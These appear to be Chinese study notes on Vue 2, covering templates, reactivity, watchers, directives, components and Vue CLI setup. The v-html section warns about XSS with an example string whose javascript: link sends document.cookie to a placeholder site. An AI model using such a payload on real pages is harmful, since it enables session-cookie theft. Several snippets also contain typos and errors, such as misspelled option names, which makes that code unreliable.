# Vue核心

## 1.1Vue简介

> VueApi
> 

[API 参考 | Vue.js](https://cn.vuejs.org/api/)

1、Vue是什么？一套用于***构建用户界面***的***渐进式***Js框架

***渐进式***：简单应用一个核心库解决、复杂应用引入插件

2、谁开发的？尤雨溪

3、特点

1. 采用***组件化***模式，提高代码复用率，更好维护代码
2. ***声明式***编码，无需直接操作DOM，提高开发效率
3. ***虚拟DOM*** + 优秀的***Diff算法*** 尽量复用DOM结点

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306051744996.png" alt="vue实现" style="zoom: 67%;" />

vue实现

4、学习Vue之前还需要具备的前端技术栈

1. ES6语法规范
2. ES6模块化
3. 包管理器
4. 原型、原型链
5. 数组常用方法
6. axios
7. promise

### 总结

1. 想让Vue工作就要创建一个Vue实例，要传入一个配置对象{}
2. root容器里面的代码仍然符合html规范，只不过有Vue特殊的语法
3. root容器里面的代码被成为Vue模板
4. Vue和容器是一一对应的
5. 真实开发中只有一个实例，并且会配合着***组件***一起使用
6. {{xxx}}中xxx要写js表达式，且xxx可以自动读取到Vue实例的data对象中所有属性

```jsx
const x = new Vue({
    el: '#root', //el用于指定当前Vue实例为哪个div容器服务
    data: {// 用于存储数据，数据供el指定的容器使用
        name: 'Yovvis',
				url: 'https:www.baidu.com' //要用指令语法
    }
})
```

注意区分js表达式和js代码

1. 表达式有值
2. js代码是语句，是代码片段

## 1.2模板语法

1. 插值语法：
    1. 功能：用于解析***标签体***
    2. 写法：{{xxx}}，xxx是js表达式，且可以读取到data中的所有属性
2. 指令语法：
    1. 功能：用于解析***标签属性***（包括：标签属性，标签体内容，绑定事件）
    2. 举例：v-bind:href=’xxx’ 或者简写 :href=‘xxx’，这里的xxx也是js表达式，且可以获取到data里面所有属性
    3. 备注：Vue中很多指令都是v-???，这里v-bind是其中一个

## 1.3数据绑定

v-bind：

1. 单向绑定，数据有data流向页面

v-model：

1. 双向绑定（必须要交互的，只能应用在表单类元素）
2. v-model默认收集的是value值，因此***v-model:value = v-model***

## 1.4el与data的写法

***el***

1. el: “#root”
2. const v = new Vue({   })  == > v.***$mount***(”#root”)         $mount在set name下面

***data***

1. 对象式  data：+json
2. 函数式  data:   function(){} this返回的是***Vue实例***  不能用data:()— >{} 箭头函数找不到this，this是***BOM对象***     

## 1.5MVVM模型*

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306051743266.png" alt="MVVM模型" style="zoom:50%;" />

MVVM模型

观察发现：

1. data中所有的属性，最后都出现在vm身上
2. vm身上所有的属性及Vue原型上所有属性，在Vue模板中都是可以直接使用

## 1.6数据代理

### defineProperty函数

```jsx
let number = 18
let person = {
	name: '张三',
	sex: '男'
}

Object.defineProperty(person,'age',{
	value: 18，
	ennumberable: true, // 控制属性是否可以被枚举，默认值是false
	writable: true,     // 控制属性是否可以被修改，默认值是false
	configurable: true  // 控制属性是否可以被删除，默认值是false

	// 当有人读取person的age属性时，get函数（getter）就会被调用，返回就是age值
	get(){
		console.log("有人读取age属性了");
		return number
	},

	// 当有人修改person的age属性时，set函数（setter）就会被调用，且会收到修改值
	set(value){
		console.log('有人读取age属性了');
		number = value
	}

})
```

### 数据代理：

通过一个对象代理对另一个对象中属性的操作（读 / 写）

```jsx
let obj1 = {x:100}（data）
let obj2 = {y:200}（vm）
Object.defineProperty(obj2,'x',{
	// 当有人读取person的age属性时，get函数（getter）就会被调用，返回就是age值
	get(){
		console.log("有人读取age属性了");
		return obj1.x
	},

	// 当有人修改person的age属性时，set函数（setter）就会被调用，且会收到修改值
	set(value){
		console.log('有人读取age属性了');
		obj1.x = value
	}

})
```

### vue数据代理

上面的obj2就是vm，obj1就是data，***vm会给vm原型链自己加上***_data***的属性***

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306051743443.png" alt="Untitled" style="zoom:50%;" />

这里vm._data === [options.data](http://options.data) === data

_data里面做了***数据劫持***

1. Vue中的数据代理：
   
    通过vm对象来代理data对象中属性的操作
    
2. Vue中数据代理的好处：
   
    更方便的操作data中的数据
    
3. 基本原理：
   
    通过Object.defineProperty()把data对象中所有属性添加到vm上，且指定一个getter和setter，用getter和setter操作data中的属性
    

## 1.7事件处理

```jsx
<button v-on:click="showInfo">欢迎来到yovvis(不传参)</button>
<button v-on:click="showInfo(66,***$event***)">欢迎来到yovvis（传参）</button>
const x = new Vue({
    el: '#root', //el用于指定当前Vue实例为哪个div容器服务
    data: {// 用于存储数据，数据供el指定的容器使用
        name: 'Yovvis',
            url: 'https:www.baidu.com' //要用指令语法
    },
		method: {
            showInfo(event){
                    // event就是<button></button>
                    console.log(this);// this就是vm
                    alert(event);
            },
            showInfo2(num,event){
                // event就是<button></button>
                console.log(this);// this就是vm
                alert(event);
            }
		}
})
```

事件基本使用：

1. 使用v-on:xxx或@xxx绑定事件,其中xxx是事件名
2. 事件的回调需要配置在methods对象中，最终会在vm上;
3. methods中配置的函数，不要用箭头函数!否则this就不是vm了;
4. 4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm或组件实例对象;
5. @click="demo”和@click=""demo($event)”效果一致，但后者可以传参;

### 事件修饰符

~~~js
@click.xxx=""
~~~

vue中的事件修饰符:

1. prevent:阻止默认事件（常用）;
2. stop:阻止事件冒泡（常用）
3. once:事件只触发一次（常用);
4. capture:使用事件的捕获模式;
5. self:只有event.target是当前操作的元素是才触发事件;
6. passive:事件的默认行为立即执行，无需等待事件回调执行完毕;

div（外）——>div（内）***捕获*** ——内——>外冒泡

@wheel可以一直滚；@scroll不可以

他们的逻辑是   滚动——执行事件——条下移，但是加上passive就立刻滚动了

***修饰符可以连续写***

### 键盘事件

@keyup.enter=”method”

特殊的@keyup.caps-lock=”method”（分割）

1. Vue中常用别名
   
    回车 enter
    
    删除 delete
    
    退出 esc
    
    空格 space
    
    换行 tab （keydown）
    
    上下左右 up down left right
    
2. Vue未提供别名的按键，可以使用按健原始的key值去绑定，但注意要转为kebab-case(短横线命名)
3. 系统修饰键（用法特殊）:ctr1、alt、shift、meta
   (1).配合keyup使用:按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
   
    (2).配合keydown使用:正常触发事件。
   
4. 也可以使用keyCode去指定具体的按键（不推荐)
5. Vue.config.keyCodes.自定义健名=键码,可以去定制按键别名

***键盘可以连写***

## 1.8计算属性

在Vue中data里面是属性，通过data里面属性操作后生成的属性

```jsx
computed:{
	fullName: {
		// 初次读取fullName时候，所依赖的数据变化时会加载，不然就读取缓存里的值
		get(){
			return this.firstName + "-" + this.lastName;
		},
		set(value){
			this.firstName = value.split("-")[0];
			this.lastName = value.split("-")[1];
		}
	}
}
```

_data中是不会有计算属性的

这里是拿到getter的返回值放到vm身上

1. 定义：要用的属性不存在，要通过已有的属性计算得来
2. 原理：底层还是借助[Object.defineproperty]方法提供的getter和setter
3. getter函数什么时候执行
    1. 初次读取会执行，并放入缓存
    2. 依赖的数据发生改变时会再次调用
4. 优势：与method机制，内部有缓存机制，效率更高，调试方便
5. 备注：
    1. 计算属性最后会挂载在vm上，直接读取调用
    2. 如果计算属性要被修改，必须改setter，且要在setter修改依赖的属性

***简写***

只考虑读取不考虑修改

```jsx
computed:{
	fullName: function(){
        return this.firstName + "-" + this.lastName;
	}
}
computed:{
	fullName(){
        return this.firstName + "-" + this.lastName;
	}
}

```

***注意：***@click=“isHot ? ‘炎热’：’凉爽’”，事件中可以直接写返回语句，但是一定是定义在data里面的属性

## 1.9监视属性

两个方法，在创建实例的时候想监视的时候用**<u>*法一*</u>**

~~~js
watch: {
    isHot:{
        immediate:true,// 初始化的时候让handler调用一下（也就是isHot发生改变的时候）
    	handler(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue)
        }
    }
}
~~~

或者

~~~js
vm.$watch('isHot',{
 	immediate:true,// 初始化的时候让handler调用一下（也就是isHot发生改变的时候）
    handler(newValue,oldValue){
        console.log('isHot被修改了',newValue,oldValue)
    }
})
~~~

### 总结

监视属性watch:

1. 当被监视的属性变化时，回调函数自动调用，进行相关操作
2. 监视的属性必须存在，才能进行监视!!
3. 监视的两种写法:
	1. new Vue时传入watch配置
	2. 通过vm.$watch监视

### 深度监视

~~~js
data:{
    numbers:{
        a:1,
        b:1
    }
}
watch:{
    numbers:{
        //'numbers.a':{},
        deep:true,
        handle(){
            console.log('isHot被修改了',newValue,oldValue)
        }
	}
}
~~~

#### 总结

1. vue中的watch默认不监测对象内部值的改变(一层）
2. 配置deep:true可以监测对象内部值改变（多层）

#### 备注

1. Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以!
2. 使用watch时根据数据的具体结构，决定是否采用深度监视。

### 监视简写

简写形式的前提：1、不需要immediate2、不需要深度监视

~~~js
watch:{
    isHot(newValue,oldValue){
     	console.log('isHot被修改了',newValue,oldValue)
    }
}
~~~

~~~js
vm.$watch('isHot',function(newValue , oldValue){
    console.log('isHot被修改了',newValue,oldValue)
})
~~~

### 监视和计算属性

computed和lwatch之间的区别:

1. computed能完成的功能,watch都可以完成。
2. watch能完成的功能，computed不一定能完成，例如: watch可以进行异步操作。

两个重要的小原则:

1. 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm或组件实例对象。
2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数,Promise的回调函数等)，最好写成箭头函数，这样this的指向才是vm或组件实例对象。

## 1.10绑定CSS样式

- .basic
- .happy .sad .normal
- yovvis1
- yovvis2
- yovvis3

1. 用v-bind或者：控制class
2. js生成随机数Math.floor(Math.random()*3)向下取整
3. arr.push()和arr.shift()

### 总结

绑定样式:

1. class样式

	写法:class="xxx" xxx可以是字符串、对象、数组。

	字符串写法适用于:类名不确定，要动态获取。

	对象写法适用于:要绑定多个样式，个数不确定，名字也不确定。

	数组写法适用于:要绑定多个样式，个数确定，名字也确定，但不确定用不用。

2. style样式

	: style="{fontsize: xxx]"其中xxx是动态值。

	: style="[a,b]"其中a、b是样式对象。

## 1.11条件渲染

~~~js
<div v-if="n==1">aaa</div>
~~~

条件渲染:

1. v-if

	写法：

	​	(1).v-if="表达式"

	​	(2).v-else-if="表达式"

	​	(3).v-else="表达式"

	适用于:切换频率较低的场景。

	特点:不展示的DOM元素直接被移除。

	注意:v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”

2. v-show

	写法: v-show="表达式"

	适用于:切换频率较高的场景。

	特点:不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

3. 备注:使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

**<u>*ps:*</u>**template标签只能和v-if使用

~~~js
<div id="root">
    <h2>当前的n值是：{n})</h2>
	<button@click:="n+">点我n+l</button>
	<!--使用V-show做条件渲染-->
	<!--<h2v-show="false">欢迎米到{{name}}</h2>->
	<!--<h2v-show="1==1">欢迎来到[{name}}</h2>-->
	<!-使用v-if做条件渲染-->
	<!--<h2v-if="false">欢迎米到{{name}</h2>-->
	<!--<h2v-if="1==1">欢迎米到{{name}}</h2>-->
	<-v-elsev-else-if --
	<!--<div v-if="n ==1">Angular</div>
	<div v-else-if="n ==2">React</div>
	<div v-else-if="n ==3">Vue</div>
	<divv-else>哈哈</div>->
I
	<template v-if="n ===1">
		<h2>你好</h2>
		<h2>尚硅谷</h2>
		<h2>北京</h2>
	</template>
</div>
~~~

## 1.12列表渲染

### 基本列表

这里是用遍历数组举例

~~~js
<ul>
	<li v-for="p in persons" :key='p.id'>
    	{{p.name}}-{{p.age}}    
    </li>    
</ul>

<ul>
	<li v-for="(p,index) in/of persons" :key='index'>
    	{{p.name}}-{{p.age}}    
    </li>    
</ul>
new Vue({
    data:{
        persons:[
            {id:'1',name:'1',age:15},{id:'2',name:'1',age:16},{id:'3',name:'1',age:17}
        ]
    }
})
~~~

react一定要有v-for要有key

1. 用于展示列表数据
2. 语法:v-for="(item,index) in xxx" :key="yyy"
3. 可遍历:数组、对象、字符串（用的很少)、指定次数（用的很少)

### key原理

用index破环顺序的操作

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306081316524.png" alt="image-20230608131628360" style="zoom: 50%;" />

用唯一标识不会出问题

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306081318200.png" alt="image-20230608131846052" style="zoom: 50%;" />

#### 面试题

面试题: react、 vue中的key有什么作用?(key的内部原理)？

1. 虚拟DOM中key的作用:

	key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DON】,

	随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下:

2. 对比规则:

	1. 旧虚拟DOM中找到了与新虚拟DOM相同的key:

		- 若虚拟DOM中内容没变,直接使用之前的真实DOM !

		- 若虚拟bow中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM.

	2. 旧虚拟DOM中未找到与新虚拟DOM相同的key

		- 创建新的真实DOM，随后渲染到到页面。

3. 用index作为key可能会引发的问题:

	1. 若对数据进行:逆序添加、逆序删除等破坏顺序操作:

		会产生没有必要的真实DOM更新==〉界面效果没问题,但效率低。

	2. 如果结构中还包含输入类的DOM:

		会产生错误DOM更新==>界面有问题。

4. 开发中如何选择key?:

	1. 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值。
	2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示,使用index作为key是没有问题的。

### 列表过滤

排序（改变原数据）+过滤（生成新数据）

~~~js
new Vue({
    data:{
        keyword:"",
        sortType: 0, //0是原顺序 1降序 a-b 1升序b-a
        persons:[
            {id:'1',name:'张三',age:35},{id:'2',name:'李四',age:21},{id:'3',name:'王五',age:17}
        ]
    }，
    computed:{
    	filPersons:{
    	  const arr = this.persons.filter((p)=>{
    			return p.name.indexof(this.keywords)! ==-1
			})
         return arr
		}
	}
})
~~~

### 列表排序

~~~js
new Vue({
    data:{
        keyword:"",
        sortType: 0, //0是原顺序 1降序 b-a 1升序a-b
        persons:[
            {id:'1',name:'张三',age:35},{id:'2',name:'李四',age:21},{id:'3',name:'王五',age:17}
        ]
    }，
    computed:{
    	filPersons:{
    	  const arr = this.persons.filter((p)=>{
    			return p.name.indexof(this.keywords)! ==-1
			})
         // 判断是否需要排序
          if(this.sortType){
              arr.sort((p1,p2)=>{
                  return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
              })
          }
		  return arr
		}
	}
}) 
~~~

### 更新问题

~~~js
// 上述的persons
methods:{
    update(){
       // this.persons[0].name = "12121" //奏效
        persons[0] = {id:'1',name:'张三',age:14} // 不行
    }
}
~~~

### 监测数据的原理-对象

本质就是从**<u>*data加工*</u>**==> **<u>*vm._data=data*</u>**

~~~js
let data = {
    name: 'yovvis',
    address: '苏州'
}
Object.defineProperty(data, 'name', {
    get() {
        return data.name;
    },
    set(val) {
        data.name = val;
    }
})
~~~

上述代码会陷入死循环

### 自定义监视器

~~~js
let data = {
    name: 'yovvis',
    address: '苏州'
}

// 创建一个监视实例的对象，用于监视data中属性的变化
const obs = new Observer(data);

// 准备vm实例对象
let vm = {}
vm._data = data = obs;

function Observer(obj) {
    // 汇总对象中所有属性为 数组
    const keys = Object.keys(obj);
    // 遍历
    keys.forEach((k) => {
        // 这里的this是observer
        Object.defineProperty(this, k, {
            get() {
                return obj[k];
            },
            set(val) {
                console.log("name值被改了，解析中，生成虚拟dom》》》");
                obj[k] = val;
            }
        })
    })
}
~~~

### Vue.set使用

Vue.set(vm.student,'sex','男')或者vm.$set(vm.student,'sex','男')

此处set不能直接作用**<u>*data*</u>**下的属性或者是**<u>*响应式对象*</u>**

### 监测数据的原理-数组

上文**<u>*更新问题*</u>**其实如下

vm._data.student.hobby[0] = '学习'

- 实际上确实改了，但是Vue不认可，原因是数组里面的数据没有getter和setter

- 一个数组操作 push(后加) pop(删尾)shift(删首) unshift(前加) splice(替换某个位置指定元素) sort(排序) reverse(反转) 

- 通过**<u>*包装*</u>**检测，不是调用的Array.prototype.push
- vue中的push做了两件事，先调原型Array。。。,然后重写解析模板，生成虚拟dom

~~~js
Vue.set(vm.student,index,'打台球')// 修改可以用set
~~~

### 大总结

Vue监视数据的原理:

1. vue会监视data中所有层次的数据。

2. 如何监测对象中的数据?

   通过setter实现监视，且要在new Vue时就传入要监测的数据。

   (1).对象中后追加的属性，Vue默认不做响应式处理

   (2).如需给后添加的属性做响应式，请使用如下API:

   ​	Vue.set(target.propertyName/index，value)或

   ​	vm.$set(target.propertyName/index，value)

3. 如何监测数组中的数据?

   通过包裹数组更新元素的方法实现,本质就是做了两件事:

   (1)．调用原生对应的方法对数组进行更新。

   (2).重新解析模板,进而更新页面。

4. 在Vue修改数组中的某个元素一定要用如下方法:

   1. 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
   2. Vue.set()或vm.$set()

特别注意: Vue.set()和vm.$set()不能给vm 或 vm的根数据对象添加属性!!

## 1.13收集表单数据

收集表单数据:

​	若:<input type="text"/>，则v-model收集的是value值，用户输入的就是value值

​	若:<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。

​	若:<inpuf type="checkbox" />

​		1.没有配置input的value属性，那么收集的就是checked（勾选 or未勾选，是布尔值)

​		2.配置input的value属性:

​			(1)v-model的初始值是非数组，那么收集的就是checked（勾选or未勾选，是布尔值）

​			(2)v-model的初始值是数组，那么收集的的就是value组成的数组

​	备注:v-model的三个修饰符:

​		.lazy:失去焦点再收集数据

​		.number:输入字符串转为有效的数字

​		.trim:输入首尾空格过滤

## 1.14过滤器

~~~js
// 全局过滤器
Vue.filter('myfilter',function(value){
   return value.slice(0,4);
})

// 局部过滤器
<h1>{{msg | myfiler | myfilter2 }}</h1>

filters:{
    myfilter(value){
        return value.slice(0,4);
    }
}
~~~

过滤器:
定义:对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。

语法:

1. 注册过滤器: Vue.filter(name,callback)或new Vue{filters:{]
2. 使用过滤器:{{ xxx│过滤器名}}或v-bind:属性= “xxx│过滤器名"

备注:

1. 过滤器也可以接收额外参数、多个过滤器也可以串联
2. 并没有改变原本的数据,是产生新的对应的数据

## 1.15内置指令

我们学过的指令:

v-bind:单向绑定解析表达式，可简写为:xXX

v-model :双向数据绑定

v-for:遍历数组/对象/字符串

v-on:绑定事件监听,可简写为@

v-if:条件渲染（动态控制节点是否存存在)

v-else:条件渲染（动态控制节点是否存存在)

v-show:条件渲染（动态控制节点是否展示)

### v-text

1. 作用:向其所在的节点中渲染文本内容。
2. 与插值语法的区别: v-text会替换掉节点中的内容，{ixx}}则不会。

### v-html

要考虑到安全性问题

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306101839442.png" alt="image-20230610183854816" style="zoom:50%;" />

v-html指令:

1. 作用:向指定节点中渲染包含html结构的内容。

2. 与插值语法的区别:

   (1).v-html会替换掉节点中所有的内容,{{xx}}则不会。

   (2).v-html可以识别html结构。

3. 严重注意: v-html有安全性问题!!!!

​	(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。

​	(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上!

~~~js
<div v-html="str"></div>
new Vue(){
    el:"#root",
    data:{
        str:'<a href=javascript:location.href="xxxx网站?"+document.cookie >兄弟我找到很好玩的东西'
    }
}
~~~

### v-cloak

v-cloak指令(没有值):

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
2. 使用css配合v-cloak可以解决网速慢时页面展示出{{xXx}}的问题。

### v-once

v-once指令:

1. v-once所在节点在初次动态渲染后，就视为静态内容了。
2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

### v-pre

v-pre指令:

1. 跳过其预在节点的编详过霜.
2. 可利用它跳过:没有使用指令语法、没有使用插值语法的节点。公加快编译。

## 1.16自定义指令

~~~js
directives:{
    big(element,binding){
        element.innerText = binding.value * 10
    }
}
~~~

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306171133161.png" alt="image-20230617113302050" style="zoom: 67%;" />

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306171137620.png" alt="image-20230617113743545" style="zoom:67%;" />

~~~vue
Vue.directive('fbind',{
	//指令与元素成功绑定时（一上来）
	bind(element,binding){
		element.value binding.value
	}
	//指令所在元素被插入页面时
	inserted(element,binding){
		element.focus()
	}
	//指令所在的模板被重新解析时
	update(element,binding){
		element.value = binding.value
	}
}
~~~



### 总结

一、定义语法:

(1).局部指令:

~~~js
new Vue({
    directives:{指令名:配置对象}
})
new Vue({
    directives(){0}
})
~~~

(2).全局指令:

Vue.directive(指令名,配置对象）或Vue.directive(指令名凹调函双)

**二、配置对象中常用的3个回调:**

​	(1).bind:指令与元素成功绑定时调用。

​	(2).inserted:指令所在元素被插入页面时调用。

​	(3).update:指令所在模板结构被重新解析时调用。

三、备注:

1. 指令定义时不加v-，但使用时要加v-;
2. 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
3. **<u>*这里的this都是win*</u>**

## 1.17生命周期*

### 引出生命周期

1. 又名:生命周期回调函数、生命周期函数、生命周期钩了。
2. 是什么:Vue在关键时刻帮我们调用的一些特殊名称的函数。
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
4. 生命周期函数中的this指向是vm或组件实例对象。

### 分析生命周期

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306111359930.png" alt="image-20230611135908709" style="zoom: 80%;" />

### 总结

常用的生命周期钩子：

1. mounted:发送ajax请求、启动定时器绑定自定义事件、订阅消息等【初始化操作】。
2. beforeDestroy:清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
3. 关于销毁Vue实例
4. 销毁后借助Vue开发者工具看不到任何信息。
5. 销毁后自定义事件会失效，但原生D0州事件依然有效。
6. 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。





# vue组件化编程

[API 参考 | Vue.js](https://cn.vuejs.org/api/)

> 组件就是一块砖，哪里需要哪里搬

## 2.1模块(化)与组件(化)

组件就是实现应用中 **<u>*局部*</u>** 功能 **<u>*代码*</u>** 和 **<u>*资源*</u>** 的 **<u>*集合*</u>**

- 模块化：当应用中的js都以模块来编写，那这个应用就是一模块化应用
- 组件化：当应用中的功能都是多组件的方式来编写的，那这个应用就是组件化的应用

## 2.2非单文件组件

### 基本使用

三步骤

1. 创建
2. 注册
3. 使用

就是一个文件里写了多个组件：<u>***过渡***</u>

~~~js
<div>
	<student></student>    
</div>

const stu = Vue.extend({
    template:'
    	<div>
    		<h1>你好{{name}}</h1>
    	</div>
    ',
    data(){
    	return {
            name: 'yovvis',
        }
	}
})
// 局部注册
new Vue({
    el:"#root",
    components:{
        student : stu
    }
})
// 全局注册
Vue.component("stu",stu);
~~~

### Vue使用组件的三步骤：

1. 定义组件（创建组件）
2. 注册组件
3. 使用组件（写组件标签）

一、如何定义一个组件？

使用Vue.extend(options)创建，其中options.和Inew Vue(options)时传入的那个options几乎一样，区别如下

1. e1不要写，为什么？

	最终所有的组件都要经过一个vm的管理，由vm中的e1决定服务哪个容器

2. data必须写成函数，为什么？

	避免组件被复用时，数据存在引用关系。

	各注：使用template标签可以配置组件结构。

二、如何注册组件？

1. 局部注册：靠new Vuel的时候传入components.选项
2. 全局注册：Vue,component('组件名'，组件)

三、编写组件标签：

<stu></stu>

### 注意点

1.关于组件名：
	一个单词组成：
		第一种写法（首字母小写）：schoo1
		第二种写法（首字母大写）：Schoo1
	多个单词组成：
		第一种写法(kebab-case命名)：my-school
		第二种写法(CamelCase命名)：MySchool(需要Vue脚手架支持)
	备注
		(1).组件名尽可能回避HTML中己有的元素名称，例如：h2、H2都不行。
		(2).可以使用name配置项指定组件在开发者工具中呈现的名字。
2.关于组件标签：
	第一种写法：<schoo1></schoo1>
	第二种写法：<school/>
	各注：不用使用脚手架时，<schoo1/>会导致后续组件不能渲染。
3,一个简写方式：
	const school=Vue,extend(options)可简写为：const school=options

### 组件的嵌套

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306151609016.png" alt="image-20230615160901619" style="zoom:67%;" />

### VueComponent





关于VueComponent:

1. school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的

2. 我们只需要写<schoo1/>或<schoo1></school>,Vue解析时会帮我们创建schoo1组件的实例对象，即Vue播我们执行的：new VueComponent(options)。

3. 特别注意：每次调用Vue.extend,返回的都是一个全新的VueComponent!!!!

4. 关于this指向：

	(1).组件配置中：

	data函数、methods中的函数、watch中的函数、computed中的函数它们的this均是【VueComponent实例对象】

	(2),new Vue()配置中：

	data函数、methods中的函数、watch中的函数、computed中的函数它们的this均是【Vue实例对象】

5. 5.VueComponent的实例对象，以后简称vc(也可称之为：组件实例对象)

	Vue的实例对象，以后简称vm。

### 一个重要的内置关系

首先什么是原型

![image-20230615170559069](https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306151705191.png)

~~~js
 function Person() {
    this.a = 5;
    this.b = 6;
}

const p1 = new Person();

console.log('@', Person.prototype) //显示原型属性
Person.prototype.x = 99;
console.log('@', p1.__proto__) // 隐式原型属性
~~~

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306151724169.png" alt="image-20230615172402114" style="zoom:67%;" />

实际上看不到Cat的prototype和catMimi中的_ _proto_ _

所以

1. 一个重要的内置关系：VueComponent.prototype_proto_=Vue.prototype
2. 为什么要有这个关系：让组件实例对象(vc)可以访问到Vue原型上的属性、方法。

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306151809233.png" style="zoom:67%;" />

## 2.3单文件组件

~~~vue
<template>
    <div class="demo">
        <h2>名称：{{name}}</h2>
        <h2>地址：{{address}}</h2>
        <button @click="showName">点我</button>
    </div>
</template>
<script>
export default {
  name: "School",
  data() {
    return {
      name: "yyy",
      address: "盐城",
    };
  },
  methods: {
    showName() {
      alert(this.schoolName);
    },
  },
};
</script>
<style>
.demo {
  background-color: orange;
}
</style>
~~~

export是暴露出去

有三种

1. export 打头 是分别暴露

	~~~vue
	export const school = Vue.extend(
		data(){…
		},
		methods:{…
		}
	})
	~~~

2. export 最后 统一暴露

	~~~vue
	const school = Vue.extend(
		data(){…
		},
		methods:{…
		}
	})
	export {school}
	~~~

3. 默认暴露

	~~~vue
	const school = Vue.extend(
		data(){…
		},
		methods:{…
		}
	})
	export defalut school
	~~~

### 整个流程

html

~~~html
<body>
    <div id="root">
    </div>
    <script type="text/javascript" src="../js/vue.js"></script>
    <script type="text/javascript" src="./app.js"></script>
</body>
~~~

app.js

~~~js
import App from './App.vue'

Vue.config.productionTip = false

new Vue({
    el: '#root',
    template: '<App></App>',
    components: { App }
})
~~~

App.vue

~~~vue
<template>
  <div>
    <Student />
    <School />
  </div>
</template>

<script>
import School from "./School.vue";
import Student from "./Student.vue";

export default {
  name: "App",
  components: { Student, School },
};
</script>

<style>
</style>
~~~

# Vue脚手架

[API 参考 | Vue.js](https://cn.vuejs.org/api/)

[API 参考 | Vue-cli](https://cli.vuejs.org/zh/guide/)

[API 参考 | Vite](https://cn.vitejs.dev/guide/)

## 3.1分析脚手架

1. Vue脚手架是Vue官方提供的**标准化开发工具**（开发平台）
2. 最新版本是4.X
3. 文档

~~~bash
npm config set prefix "D:\evns\nodejs\node_modules\node_global"
npm config set cache "D:\evns\nodejs\node_modules\node_cache"
npm config set registry https://registry.npm.taobao.org
npm i -g yarn
yarn config set registry https://registry.npm.taobao.org
npm config get registry

npm install -g @vue/cli
vue create xxx
npm run serve
~~~

卸载

~~~bash
yarn global remove @vue/cli（可能不太行）

npm uninstall vue-cli -g

npm config ls -l
where vue
npm uninstall -g @vue/cli
~~~

### 目录

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306152033200.png" alt="image-20230615203305126" style="zoom: 80%;" />



~~~txt
D:\vscode\myapp
├── public
|  ├── favicon.ico			页面标签
|  └── index.html			主页面
├── src
|  ├── assets				存放静态资源
|  |  └── logo.png
|  ├── components			存放组件
|  |  ├── SchoolVue.vue
|  |  └── StudentVue.vue
|  ├── App.vue				汇总所有组件
|  └── main.js				入口文件
├── babel.config.js			babel的配置文件
├── jsconfig.json
├── package-lock.json		包版本控制文件
├── package.json			应用包配置文件
├── README.md
└── vue.config.js
~~~

其中html结构分析

~~~html
<!DOCTYPE html>
<html lang="">

<head>
    <meta charset="utf-8">
    <!-·针对IE浏览器的一个特殊配置，含义是让工E浏览器以最高的渲染级别渲染页面->
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <!-开启移动端的理想视口->
            <meta name="viewport" content="width=device-width,initial-scale=1.0">
            <!-配置页签图标->
                <link rel="icon" href="<%=BASE URL %>favicon.ico">
                <!-配置网页标题->
                    <title>
                        <%=htmlWebpackPlugin.options.title %>
                    </title>
</head>

<body>I
    <noscript>
        <strong>We're sorry but <%=htmlWebpackPlugin.options.title %doesn't work </strong>
    </noscript>
    <div id="app"></div>
</body>

</html>
~~~

### render

~~~js
import Vue from 'Frontend/Vue/Vue'
import App from './App.vue'

Vue.config.productionTip = false //生产提示符

new Vue({
	render: h => h(App),
}).$mount('#app')
~~~

这里引用的 vue 是残缺版的，缺少的了模板解析器，本质上了 vue 的文件夹下面的package里面的 module 所配置的 esm.js（默认引入的ES6模块化的 vue ）

- 要么添加模板解析器
- 要么引用完整版的 vue

render简化

~~~js
new Vue({
  	el：'#root',
  	render(createElement){
    	return createElement(App);
	}
   	--------------------------
    render:(createElement)=>{
    	return createElement(App);
	}
    --------------------------
     render:createElement=>{
    	return createElement(App);
	}
    --------------------------
     render:(createElement)=> hreateElement(App);
	--------------------------
     render: h=> h(App);
})
~~~

